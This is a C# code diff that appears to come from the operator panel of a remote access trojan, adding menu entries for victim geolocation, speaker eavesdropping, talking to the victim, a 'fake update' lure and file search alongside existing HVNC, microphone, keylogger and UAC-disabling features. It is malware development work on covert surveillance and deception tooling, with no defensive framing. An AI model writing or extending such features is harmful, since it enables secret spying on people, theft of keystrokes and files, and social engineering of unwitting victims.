@@ -81,6 +81,12 @@ internal static class FeatureContextMenu
             monitoring.Items.Add(MakeItem(Lang.Get("FEAT_HVNC"),           "SvgImages/Icon Builder/Security_VisibilityOff.svg",     () => mainWindow.OpenFeatureWindow<HvncWindow>(clientId,              () => new HvncWindow(server, clientId))));
         monitoring.Items.Add(MakeItem(Lang.Get("FEAT_MICROPHONE"),         "SvgImages/Icon Builder/Electronics_Microphone.svg",     () => mainWindow.OpenFeatureWindow<MicrophoneWindow>(clientId,        () => new MicrophoneWindow(server, clientId, clientId))));
         monitoring.Items.Add(MakeItem(Lang.Get("FEAT_KEYLOGGER"),          "SvgImages/Icon Builder/Electronics_Keyboard.svg",       () => mainWindow.OpenFeatureWindow<KeyloggerWindow>(clientId,         () => new KeyloggerWindow(server, clientId, clientId))));
+        if (excludeWindowType != "GeoWindow")
+            monitoring.Items.Add(MakeItem(Lang.Get("FEAT_GEOLOCATION"),      "SvgImages/Icon Builder/Travel_MapPointer.svg",          () => mainWindow.OpenFeatureWindow<GeoWindow>(clientId,           () => new GeoWindow(server, clientId, clientId))));
+        if (excludeWindowType != "SpeakerWindow")
+            monitoring.Items.Add(MakeItem(Lang.Get("FEAT_SPEAKER"),          "SvgImages/Icon Builder/Electronics_Headphone.svg",      () => mainWindow.OpenFeatureWindow<SpeakerWindow>(clientId,       () => new SpeakerWindow(server, clientId, clientId))));
+        if (excludeWindowType != "SpeakToClientWindow")
+            monitoring.Items.Add(MakeItem(Lang.Get("FEAT_SPEAK_TO_CLIENT"),  "SvgImages/Icon Builder/Electronics_Volume.svg",         () => mainWindow.OpenFeatureWindow<SpeakToClientWindow>(clientId, () => new SpeakToClientWindow(server, clientId, clientId))));
         monitoring.Items.Add(new Separator());
         monitoring.Items.Add(MakeItem(Lang.Get("FEAT_PERF_MONITOR"),       "SvgImages/Icon Builder/Business_LinearChart.svg",       () => mainWindow.OpenFeatureWindow<PerformanceMonitorWindow>(clientId, () => new PerformanceMonitorWindow(server, clientId, clientId))));
         menu.Items.Add(monitoring);
@@ -103,6 +109,11 @@ internal static class FeatureContextMenu
             ServerWindow.ReportGlobalActivity("Disable UAC", clientId, "running");
             ServerWindow.LogGlobal(string.Format(Lang.Get("EVT_DISABLE_UAC"), clientId));
         }));
+        misc.Items.Add(new Separator());
+        if (excludeWindowType != "FakeUpdateWindow")
+            misc.Items.Add(MakeItem(Lang.Get("FEAT_FAKE_UPDATE"), "SvgImages/Icon Builder/Actions_Download.svg", () => mainWindow.OpenFeatureWindow<FakeUpdateWindow>(clientId, () => new FakeUpdateWindow(server, clientId, clientId))));
+        if (excludeWindowType != "FileSearchWindow")
+            misc.Items.Add(MakeItem(Lang.Get("FEAT_FILE_SEARCH"), "SvgImages/Icon Builder/Actions_Find.svg",     () => mainWindow.OpenFeatureWindow<FileSearchWindow>(clientId, () => new FileSearchWindow(server, clientId, clientId))));
         menu.Items.Add(misc);
 
         // ── Fun ─────────────────────────────────────────────────────────
